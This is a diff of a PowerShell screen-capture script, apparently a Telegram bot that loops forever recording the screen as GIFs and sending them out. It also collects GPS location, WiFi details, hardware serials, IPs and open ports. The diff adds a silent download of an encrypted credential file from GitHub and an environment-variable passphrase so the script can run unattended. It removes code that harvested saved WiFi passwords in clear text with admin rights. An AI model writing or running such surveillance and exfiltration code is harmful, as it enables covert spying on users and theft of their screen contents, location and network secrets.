@@ -4,13 +4,40 @@ if (-not $PSScriptRoot -or $PSScriptRoot -eq '') {
 }
 
 # ===============================
-# Enable DPI Awareness to capture full resolution on high DPI screens
+# Attempt to Download cred.dat from GitHub if Not Present Locally
 # ===============================
-Add-Type -MemberDefinition @"
-    [DllImport("user32.dll")]
-    public static extern bool SetProcessDPIAware();
-"@ -Name NativeMethods -Namespace MyNamespace
-[MyNamespace.NativeMethods]::SetProcessDPIAware() | Out-Null
+$CredFile = Join-Path $PSScriptRoot "src\cred.dat"
+if (-not (Test-Path $CredFile)) {
+    Write-Host "cred.dat not found locally. Attempting to download from GitHub..."
+    try {
+        $remoteCredUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/refs/heads/main/src/cred.dat"
+        $credFolder = Split-Path $CredFile
+        if (-not (Test-Path $credFolder)) {
+            New-Item -ItemType Directory -Path $credFolder | Out-Null
+        }
+        Invoke-WebRequest -Uri $remoteCredUrl -OutFile $CredFile -UseBasicParsing
+        Write-Host "Downloaded cred.dat successfully."
+    }
+    catch {
+        Write-Host "Failed to download cred.dat. You will be prompted for credentials."
+    }
+}
+
+# ===============================
+# Function: Get Passphrase from Environment or Prompt
+# ===============================
+function Get-Passphrase {
+    if ($env:MY_CRED_PASSPHRASE) {
+        return $env:MY_CRED_PASSPHRASE
+    }
+    else {
+        return [Runtime.InteropServices.Marshal]::PtrToStringAuto(
+                    [Runtime.InteropServices.Marshal]::SecureStringToBSTR(
+                        (Read-Host "Enter passphrase to decrypt credentials" -AsSecureString)
+                    )
+                )
+    }
+}
 
 # ===============================
 # AES Encryption / Decryption Functions (Cross-Machine)
@@ -78,9 +105,6 @@ function Decrypt-String {
 # ===============================
 # Credential Handling (Using AES Encryption)
 # ===============================
-# Set credential file path (adjust folder as needed)
-$CredFile = Join-Path $PSScriptRoot "src\cred.dat"
-
 function Get-Credentials {
     param (
         [string]$CredFile
@@ -89,12 +113,8 @@ function Get-Credentials {
         Write-Host "Credential file not found. Please enter your Telegram credentials."
         $PlainBotToken = Read-Host "Enter your Telegram Bot Token"
         $PlainChatID   = Read-Host "Enter your Telegram Chat ID"
-        $PassphraseSecure = Read-Host "Enter a passphrase to encrypt your credentials" -AsSecureString
-        $Passphrase = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
-            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($PassphraseSecure)
-        )
+        $Passphrase = Get-Passphrase
         
-        # Encrypt the credentials using AES
         $EncryptedBotToken = Encrypt-String -plainText $PlainBotToken -password $Passphrase
         $EncryptedChatID   = Encrypt-String -plainText $PlainChatID   -password $Passphrase
         
@@ -102,7 +122,6 @@ function Get-Credentials {
             BotToken = $EncryptedBotToken
             ChatID   = $EncryptedChatID
         }
-        # Ensure folder exists
         $credFolder = Split-Path $CredFile
         if (-not (Test-Path $credFolder)) {
             New-Item -ItemType Directory -Path $credFolder | Out-Null
@@ -113,23 +132,20 @@ function Get-Credentials {
     }
     else {
         $CredObject = Get-Content $CredFile -Raw | ConvertFrom-Json
-        $PassphraseSecure = Read-Host "Enter passphrase to decrypt credentials" -AsSecureString
-        $Passphrase = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
-            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($PassphraseSecure)
-        )
+        $Passphrase = Get-Passphrase
         $DecryptedBotToken = Decrypt-String -cipherText $CredObject.BotToken -password $Passphrase
         $DecryptedChatID   = Decrypt-String -cipherText $CredObject.ChatID   -password $Passphrase
         return @{ BotToken = $DecryptedBotToken; ChatID = $DecryptedChatID }
     }
 }
 
-# Retrieve credentials (this will prompt for passphrase if needed)
+# Retrieve credentials (if cred.dat is available, this will load without prompting for token/chat id)
 $Creds = Get-Credentials -CredFile $CredFile
 $BotToken = $Creds.BotToken
 $ChatID   = $Creds.ChatID
 
 # ===============================
-# Function: Capture a single screenshot frame as a BitmapSource
+# Function: Capture a Single Screenshot Frame as a BitmapSource
 # ===============================
 function Capture-Frame {
     Add-Type -AssemblyName System.Windows.Forms
@@ -290,10 +306,8 @@ function Get-WindowsGeolocation {
 
 # ===============================
 # Function: Get Complete System & Network Information
-# Combines basic info with detailed hardware, BIOS, and network details.
 # ===============================
 function Get-CompleteSystemInfo {
-    # --- Basic System Information ---
     $computerName = $env:COMPUTERNAME
     $osInstance = Get-CimInstance Win32_OperatingSystem
     $osInfo = "$($osInstance.Caption) (Version: $($osInstance.Version))"
@@ -304,7 +318,6 @@ function Get-CompleteSystemInfo {
                  "OS: $osInfo`n" +
                  "Date/Time: $dateTime`n"
 
-    # --- WiFi Info (from netsh) ---
     try {
         $wifiOutput = netsh wlan show interfaces | Out-String
         $ssid   = ($wifiOutput | Select-String "^\s*SSID\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
@@ -318,7 +331,6 @@ function Get-CompleteSystemInfo {
     }
     $wifiInfo = "WiFi SSID: $ssid`nWiFi Signal: $signal`n"
 
-    # --- GPS Location ---
     $geo = Get-WindowsGeolocation
     if ($geo) {
         $latitude = $geo.Latitude
@@ -331,7 +343,6 @@ function Get-CompleteSystemInfo {
     }
     $locationSection = "GPS Location: $locationInfo`n"
 
-    # --- Detailed System Information ---
     $cs = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Manufacturer, Model
     $csp = Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object Name, Version, IdentifyingNumber, UUID, Vendor
     $bios = Get-CimInstance -ClassName Win32_BIOS | Select-Object SerialNumber, Version, ReleaseDate
@@ -356,8 +367,6 @@ function Get-CompleteSystemInfo {
                       "  UUID: $($csp.UUID)`n" +
                       "  Vendor: $($csp.Vendor)`n"
 
-    # --- Network Information ---
-    # IP Addresses
     $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | 
                    Where-Object { $_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -notlike '127.*' } |
                    Select-Object InterfaceAlias, IPAddress, PrefixLength
@@ -366,7 +375,6 @@ function Get-CompleteSystemInfo {
         $ipInfo += "Interface: $($ip.InterfaceAlias) - IP: $($ip.IPAddress) / $($ip.PrefixLength)`n"
     }
 
-    # Detailed WiFi Information
     try {
         $wifiAdapter = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.MediaType -eq 'Native 802.11' -and $_.Status -eq 'Up' }
         if ($wifiAdapter) {
@@ -376,19 +384,6 @@ function Get-CompleteSystemInfo {
             $wifiSection = "`nWiFi Information:`n" +
                            "ESSID: $essid`n" +
                            "BSSID: $bssid`n"
-            # Attempt to get WiFi password if running as administrator
-            $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-            if ($isAdmin) {
-                try {
-                    $profileName = ($wifiDetails | Select-String 'Profile').Line.Split(':')[1].Trim()
-                    $wifiPassword = (netsh wlan show profile name="$profileName" key=clear | 
-                        Select-String 'Key Content').Line.Split(':')[1].Trim()
-                    $wifiSection += "Password: $wifiPassword`n"
-                }
-                catch {
-                    $wifiSection += "Password: Could not retrieve WiFi password`n"
-                }
-            }
         }
         else {
             $wifiSection = "`nNo active WiFi interface found`n"
@@ -398,7 +393,6 @@ function Get-CompleteSystemInfo {
         $wifiSection = "`nError retrieving WiFi information`n"
     }
 
-    # Open Ports (Listening)
     try {
         $listeningPorts = Get-NetTCPConnection -State Listen | 
                           Where-Object { $_.LocalAddress -ne '127.0.0.1' } |
@@ -414,29 +408,24 @@ function Get-CompleteSystemInfo {
         $portsSection = "`nError retrieving open ports information`n"
     }
 
-    # Network Adapters
     $adapters = Get-NetAdapter | Where-Object Status -eq 'Up'
     $adaptersSection = "`nNetwork Adapters:`n"
     foreach ($adapter in $adapters) {
         $adaptersSection += "Name: $($adapter.Name), Description: $($adapter.InterfaceDescription), LinkSpeed: $($adapter.LinkSpeed)`n"
     }
 
-    # Default Gateway
     $defaultGateway = Get-NetRoute -AddressFamily IPv4 | Where-Object DestinationPrefix -eq '0.0.0.0/0'
     $gatewaySection = "`nDefault Gateway:`n"
     foreach ($route in $defaultGateway) {
         $gatewaySection += "NextHop: $($route.NextHop), Interface: $($route.InterfaceAlias)`n"
     }
 
-    # --- Combine All Sections ---
     $completeInfo = $basicInfo + $wifiInfo + $locationSection + $systemInfoSection + $biosSection + $enclosureSection + $productSection + $ipInfo + $wifiSection + $portsSection + $adaptersSection + $gatewaySection
-
     return $completeInfo
 }
 
 # ===============================
-# Main Loop: Capture & Send a 10-Second Screen Recording (as Animated GIF)
-# and send complete system information (including detailed hardware and network data)
+# Main Loop: Capture & Send a 10-Second Screen Recording and System Info
 # ===============================
 while ($true) {
     $gifPath = Capture-AnimatedGIF -durationSeconds 10 -framesPerSecond 3
